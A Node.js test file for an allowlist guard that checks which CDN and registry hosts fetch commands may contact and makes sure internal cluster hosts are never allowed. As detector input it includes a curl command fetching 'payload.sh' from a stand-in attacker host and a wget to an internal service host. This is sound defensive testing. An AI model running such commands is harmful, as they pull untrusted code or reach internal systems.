// node --test specs for cdn-allowlist-guard's shared core.
// Covers the pure allowlist logic: exact + wildcard host matching, URL
// hostname extraction, the fetch-command URL scan, and — critically — that no
// internal *.svc.cluster.local host is ever allowed.

import assert from 'node:assert/strict'
import { test } from 'node:test'

import {
  ALLOWED_CDN_HOSTS,
  findDisallowedCdn,
  hostnameOf,
  isAllowedCdnHost,
} from '../../_shared/cdn-allowlist.mts'

test('isAllowedCdnHost: allows public package registries', () => {
  assert.equal(isAllowedCdnHost('pypi.org'), true)
  assert.equal(isAllowedCdnHost('crates.io'), true)
  assert.equal(isAllowedCdnHost('npmjs.org'), true)
  assert.equal(isAllowedCdnHost('github.com'), true)
})

test('isAllowedCdnHost: case-insensitive', () => {
  assert.equal(isAllowedCdnHost('PyPI.org'), true)
  assert.equal(isAllowedCdnHost('CRATES.IO'), true)
})

test('isAllowedCdnHost: wildcard matches a subdomain but not the bare suffix', () => {
  assert.equal(isAllowedCdnHost('cdn.jsdelivr.net'), true)
  assert.equal(isAllowedCdnHost('a.b.githubusercontent.com'), true)
  // The bare wildcard base is NOT matched by `*.suffix`.
  assert.equal(isAllowedCdnHost('jsdelivr.net'), false)
})

test('isAllowedCdnHost: rejects an arbitrary host', () => {
  assert.equal(isAllowedCdnHost('evil.com'), false)
  assert.equal(isAllowedCdnHost('example.com'), false)
})

test('isAllowedCdnHost: NEVER allows an internal svc.cluster.local host', () => {
  assert.equal(
    isAllowedCdnHost('github-interposer.depscan.svc.cluster.local'),
    false,
  )
  assert.equal(
    isAllowedCdnHost('artifact-search-api.artifact-search.svc.cluster.local'),
    false,
  )
  assert.equal(isAllowedCdnHost('nats.nats.svc.cluster.local'), false)
})

test('the allowlist contains no internal / private hosts', () => {
  for (const host of ALLOWED_CDN_HOSTS) {
    assert.doesNotMatch(
      host,
      /\.svc\.cluster\.local$|\.internal$|\.local$/,
      `internal host leaked into ALLOWED_CDN_HOSTS: ${host}`,
    )
  }
})

test('hostnameOf: extracts host, undefined on garbage', () => {
  assert.equal(hostnameOf('https://pypi.org/simple/foo'), 'pypi.org')
  assert.equal(hostnameOf('not a url'), undefined)
})

test('findDisallowedCdn: flags a curl to an off-allowlist host', () => {
  const hit = findDisallowedCdn('curl -sSL https://evil.com/payload.sh')
  assert.equal(hit?.host, 'evil.com')
})

test('findDisallowedCdn: passes a curl to an allowed host', () => {
  assert.equal(
    findDisallowedCdn('curl https://pypi.org/simple/requests'),
    undefined,
  )
})

test('findDisallowedCdn: ignores a URL not on a fetch command', () => {
  assert.equal(findDisallowedCdn('echo https://evil.com'), undefined)
  assert.equal(findDisallowedCdn('git commit -m "see https://evil.com"'), undefined)
})

test('findDisallowedCdn: flags wget + an internal host', () => {
  const hit = findDisallowedCdn(
    'wget http://github-interposer.depscan.svc.cluster.local/x',
  )
  assert.equal(hit?.host, 'github-interposer.depscan.svc.cluster.local')
})
